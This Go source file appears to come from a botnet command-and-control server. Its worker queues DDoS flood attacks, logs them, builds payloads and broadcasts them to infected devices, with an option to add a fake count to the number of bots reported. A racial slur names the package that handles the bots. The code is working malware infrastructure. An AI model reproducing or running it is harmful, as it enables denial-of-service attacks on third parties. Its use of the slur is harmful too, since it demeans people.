package flood

import (
	"advanced-telnet-cnc/source/config"
	"advanced-telnet-cnc/source/database"
	sessions "advanced-telnet-cnc/source/master/session"
	"advanced-telnet-cnc/source/niggers"
	"advanced-telnet-cnc/source/niggers/fake"
	"fmt"
	"time"
)

type QueuedAttack struct {
	Session    *sessions.Session
	Profile    *AttackProfile
	Method     *Method
	FullTarget string
	Devices    int
	Group      string
}

var (
	queue = make(chan *QueuedAttack, 15)
)

func Worker() {
	for {
		time.Sleep(1 * time.Second)

		if database.Instance == nil {
			continue
		}

		attacks, err := database.RunningAttacks()
		if err != nil {
			continue
		}

		if len(attacks) >= config.Master.AttackSlots {
			continue
		}

		lastFlood, err := database.LastFlood()
		if err != nil {
			continue
		}

		if lastFlood != nil && lastFlood.End.Add(time.Duration(config.Master.GlobalCooldown)*time.Second).Unix() > time.Now().Unix() {
			continue
		}

		if len(queue) < 1 {
			continue
		}

		attack := <-queue

		created := time.Now()
		err = database.LogAttack(&database.Flood{
			Target:   attack.FullTarget,
			Duration: attack.Profile.Duration,
			Created:  created,
			Method:   attack.Method.Name,
			End:      created.Add(time.Duration(attack.Profile.Duration) * time.Second),
		}, attack.Session.UserProfile)
		if err != nil {
			fmt.Println(err)
			continue
		}

		logger.Logf("user=%s target=%s duration=%d cooldown=%d method=%s unix=%d", attack.Session.Name, attack.FullTarget, attack.Profile.Duration, attack.Session.Cooldown, attack.Method.Name, time.Now().Unix())

		payload, err := attack.Profile.CreatePayload()
		if err != nil {
			continue
		}

		devicesSentTo := niggers.BroadcastAttack(payload, attack.Group, attack.Devices)
		if niggers.FakeCounting {
			devicesSentTo += fake.Count()
		}

		config.Logger.Infof("Broadcasted queued %s attack to %d devices in %.3fs",
			attack.Method.Name,
			devicesSentTo,
			time.Since(created).Seconds(),
		)
	}
}
